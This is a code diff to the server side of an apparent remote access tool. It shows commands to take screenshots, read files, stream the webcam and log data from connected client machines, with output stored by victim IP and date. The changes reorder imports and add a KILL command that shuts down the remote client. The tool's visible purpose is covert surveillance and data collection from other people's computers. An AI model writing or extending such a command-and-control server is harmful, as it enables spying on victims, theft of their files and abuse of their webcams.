@@ -1,14 +1,20 @@
-import argparse, socket, threading, time, queue, os, sys, json, base64
+import argparse
+import base64
+import json
+import os
+import socket
+import threading
+import time
 
-import numpy as np
 import cv2
+import numpy as np
 
 SCREENSHOT_DIR = 'screenshots/{ip}/{date}'
 READ_FILE_DIR = 'reads/{ip}/{date}'
 LOG_FILE_DIR = 'logs/{ip}/{date}'
 
 last_client_socket = None
-
+stop = False
 
 # Function to parse the arguments
 def args_parse(command_line=None):
@@ -45,8 +51,7 @@ def command_handler_loop(server_socket):
             elif args.readfile:
                 read_file(args.readfile[0])
             elif args.kill:
-                print("Shutting down the server.")
-                sys.exit(0)
+                kill_client()
             elif args.screenshot:
                 take_screenshot()
             elif args.capture:
@@ -125,8 +130,25 @@ def receive_webcam_live():
         print(f"Error sending webcam command: {e}")
 
 
+def kill_client():
+    global last_client_socket
+    if last_client_socket is None:
+        print("No client connected to kill.")
+        return
+
+    try:
+        command = {
+            'command': 'KILL'
+        }
+        last_client_socket.send(json.dumps(command).encode())
+        print("Requested kill from client.")
+    except socket.error as e:
+        print(f"Error sending kill command: {e}")
+
+
 # Function to handle the client
 def handle_client(client_socket, client_address):
+    global stop
     while True:
         try:
             data = b""
@@ -203,6 +225,12 @@ def handle_client(client_socket, client_address):
 
                     if cv2.waitKey(1) & 0xFF == ord('q'):
                         break
+
+                if data_command == 'KILL':
+                    stop = client_info['stop']
+                    if stop:
+                        print("Killing server...")
+                        os._exit(0)
 
                 if data_command == 'ERROR':
                     error = client_info['error']
